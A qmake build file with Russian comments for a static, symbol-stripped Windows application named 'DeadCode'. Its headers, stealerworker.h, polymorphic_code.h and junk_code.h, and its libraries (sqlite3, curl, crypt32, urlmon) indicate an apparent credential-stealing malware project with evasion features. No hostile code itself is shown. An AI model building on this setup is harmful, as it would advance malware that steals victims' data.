# Основные модули Qt
QT += core gui network widgets

# Имя приложения и тип проекта
TARGET = DeadCode
TEMPLATE = app

# Настройки для статической сборки
CONFIG += static staticlib
QTPLUGIN += -

# Исходные файлы
SOURCES += \
    ../src/main.cpp \
    mainwindow.cpp

# Заголовочные файлы
HEADERS += \
    mainwindow.h \
    ../src/build_key.h \
    ../src/polymorphic_code.h \
    ../src/junk_code.h \
    ../src/stealerworker.h

# Формы Qt Designer
FORMS += mainwindow.ui

# Ресурсы Windows (иконка)
RC_FILE = $$PWD/../icon.rc

# Пути для поиска заголовков
INCLUDEPATH += \
    ../src \
    . \
    $$system_path(C:/Qt/5.15.2/mingw81_64/include) \
    $$system_path(C:/vcpkg/installed/x64-mingw-static/include)

# Библиотеки vcpkg и системные библиотеки Windows
LIBS += -L$$system_path(C:/Qt/5.15.2/mingw81_64/lib) \
        -L$$system_path(C:/vcpkg/installed/x64-mingw-static/lib) \
        -lsqlite3 \
        -lzip \
        -lz \
        -lbz2 \
        -lcurl \
        -lssl \
        -lcrypto \
        -lbcrypt \
        -lws2_32 \
        -lgdiplus \
        -liphlpapi \
        -lpsapi \
        -lshlwapi \
        -lcrypt32 \
        -lgdi32 \
        -luser32 \
        -ladvapi32 \
        -lwininet \
        -lshell32 \
        -lurlmon \
        -lole32

# Флаги компиляции
QMAKE_CXXFLAGS += \
    -O2 \
    -std=c++17 \
    -Wall \
    -Wextra \
    -Werror=return-type \
    -fexceptions \
    -DUNICODE \
    -D_UNICODE \
    -DWIN32 \
    -DWINVER=0x0602 \
    -D_WIN32_WINNT=0x0602 \
    -DQT_NO_DEBUG \
    -D_CRT_SECURE_NO_WARNINGS \
    -DQT_DISABLE_DEPRECATED_BEFORE=0x050F00 \
    -Wno-attributes

# Флаги линковки
QMAKE_LFLAGS += \
    -static \
    -static-libgcc \
    -static-libstdc++ \
    -O2 \
    -Wl,-s \
    -Wl,-subsystem,windows \
    -mthreads

# Директории для сборки
DESTDIR = ../build/release
OBJECTS_DIR = ../release
MOC_DIR = ../release
UI_DIR = ../release

# Очистка временных файлов
QMAKE_CLEAN += \
    ../build/release/DeadCode.exe \
    ../release/*.o \
    ../release/Makefile* \
    ../release/ui_*.h

# Настройки для debug-режима
win32 {
    CONFIG(debug, debug|release) {
        QMAKE_CXXFLAGS += -g
        QMAKE_LFLAGS -= -O2
    }
}

# Зависимости перед сборкой
PRE_TARGETDEPS += \
    ../src/build_key.h \
    ../src/polymorphic_code.h \
    ../src/junk_code.h \
    ../src/stealerworker.h